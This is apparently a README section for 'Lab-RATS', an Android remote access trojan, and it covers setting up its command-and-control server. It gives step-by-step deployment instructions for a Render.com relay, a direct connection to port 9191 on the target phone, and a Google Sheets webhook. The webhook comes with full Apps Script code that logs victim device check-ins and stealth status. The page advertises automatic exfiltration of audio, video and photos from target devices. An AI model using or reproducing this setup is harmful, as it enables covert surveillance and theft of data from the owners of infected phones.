# 03 ⏤ C2 Server & Deployment Options

> Lab-RATS offers 3 flexible C2 deployment options depending on your operational needs.

---

## 🚀 Comparison Matrix

| Option | Transport | C2 Web Dashboard | File Vault Storage | Setup Difficulty |
| :--- | :--- | :--- | :--- | :--- |
| **Option 1: Render C2 Relay** *(Recommended)* | HTTPS / WebSocket | **Yes** (Full 13 Tabs) | **Yes** (Audio/Video/Photos) | **Easy** (Free 1-click cloud deploy) |
| **Option 2: Direct IPv6 / IPv4** | HTTP (Port 9191) | **Yes** (Direct P2P) | **Yes** (Stored on phone) | **Medium** (Requires routable IP) |
| **Option 3: Google Sheets** | HTTP POST | No (Spreadsheet Rows) | No (Text logs only) | **Easy** (Google Apps Script) |

---

### Option 1: Render.com C2 Relay Deployment (Recommended)
**Best for newer devices running Android 16/17, Professional Fleet Management** & **Automatic File Exfiltration**.

**1. Fork the Lab-RATS-v1.6 repository**.
<br>**2. Create a new Web Service for Free** on <a href="https://render.com" target="_blank">Render.com</a> and **connect your forked Lab-RATS repo**.
<br>**3. Once connected, Set the Root Directory** to `c2-server/`
<br>**4. Set the Build Command** to `npm install` & **the Start Command** to `npm start`
<br>**5. Deploy!**

> [!IMPORTANT]
> **Once live, Copy your Render URL** *(e.g., `https://labrats-github.onrender.com`)*, and **prepare to enter it into the APK-Builder Tool when prompted** for the **C2 Webhook URL** *(Get Started Section Below)*.
<details>
  <summary><b>📸 Click to View Render Setup</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/7cc93099-7528-40b1-b261-de7f72dfc54a" alt="Full Web Page Screenshot" width="50%">
  <img src="https://github.com/user-attachments/assets/bc6d4e57-3053-4d21-b46e-f3241cdb959a" alt="Full Web Page Screenshot" width="50%">
  </details>

<details>
  <summary><b>📸 Click to View Render C2 Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/308a906f-c331-406b-8718-23b2d113a04a" alt="Full Web Page Screenshot" width="80%">
</details>

### Advantages of Option 2:
- 🌐 **Dual-Stack IP Binding**: **Full support for both IPv4 and IPv6 connections**, **enabling seamless C2 telemetry** and **reverse WebSocket tunneling** across **cellular carrier NAT64** and **dual-stack Wi-Fi networks worldwide**.
- 📂 **Exfiltration Vault**: **Audio/Video recordings** are **automatically uploaded** and **stored on your server**.
- 📡 **Live Fleet List**: A **professional dashboard** to **manage all devices in one place**, with **editable device name** for **easy device recognition** and **NEW 'Quick Action' pull-down menu** to **deploy some features without directly connecting**.
- 🔄 **Dynamic Sync**: **Heartbeat reporting** ensures your **P2P links are always up-to-date**.
---

## 📡 Option 2: Direct IPv6 / Local IPv4 Mode

When the target device has a publicly routable IPv6 address or is on the same local Wi-Fi network:
1. The app starts a built-in HTTP server directly on the device at port **`9191`**.
2. Open your browser to `http://[device-ipv6-address]:9191` or `http://[device-local-ip]:9191`.
3. Enter your C2 password to access the full control dashboard directly without cloud relays.

---

## 📊 Option 3: Google Sheets Logging Webhook

For basic check-in logging without hosting a web server:
1. **Create a new** <a href="https://docs.google.com/spreadsheets/u/0/" target="_blank">Google Sheet</a>.
2. Go to **Extensions** → **Apps Script** and **Paste in the Hybrid Snippet below:**

```javascript
function doGet(e) { return handleRequest(e); }
function doPost(e) { return 
handleRequest(e); }

function handleRequest(e) {
  try {
    var ss = SpreadsheetApp.getActiveSpreadsheet();
    var sheet = ss.getSheetByName("LabRATS Logs") || ss.insertSheet("LabRATS Logs");
    
    // Auto-initialize headers if new sheet
    if (sheet.getLastRow() == 0) {
      sheet.appendRow([
        "Timestamp", 
        "Model #", 
        "Connection Type", 
        "IP Address", 
        "Port", 
        "Active C2 Link", 
        "Battery", 
        "Stealth Status", 
        "Power", 
        "Free Storage"
      ]);
    }
    
    var data = (e.postData && e.postData.contents) ? JSON.parse(e.postData.contents) : e.parameter;
    
    var row = [
      new Date(),
      data.device || data.model || "Unknown",
      data.network || "Unknown",
      data.ip || "Unknown",
      data.port || "9191",
      data.link || "Handshake_Pending",
      data.battery || "0%",
      (data.stealth === true || 
data.stealth === "true") ? "ACTIVE" : "OFF",
      data.charging || "Discharging",
      data.storage || "Unknown"
    ];
    
    sheet.appendRow(row);
    return ContentService.createTextOutput("SUCCESS").setMimeType(ContentService.MimeType.TEXT);
  } catch (err) {
    return ContentService.createTextOutput("ERROR: " + err.message).setMimeType(ContentService.MimeType.TEXT);
  }
}
```
3. Click **Deploy** → **New Deployment** → **Web App** → **Execute as Me** *(E-Mail)* → **Who has Access: Anyone**.

4. **Copy the Google Webhook URL provided** *(e.g., `https://script.google.com/macros/s/AKfycbwXQSVQ0dYdi...`)* and **prepare to paste it into the APK-builder Tool when prompted** for the **C2 Webhook URL**.

<details>
  <summary><b>📸 Click to View Google Sheet Reporting Example</summary></b>
  <img src="https://github.com/user-attachments/assets/ad174175-eed8-46b4-bd8d-8c72895cf88a" alt="Full Web Page Screenshot" width="80%">
</details>
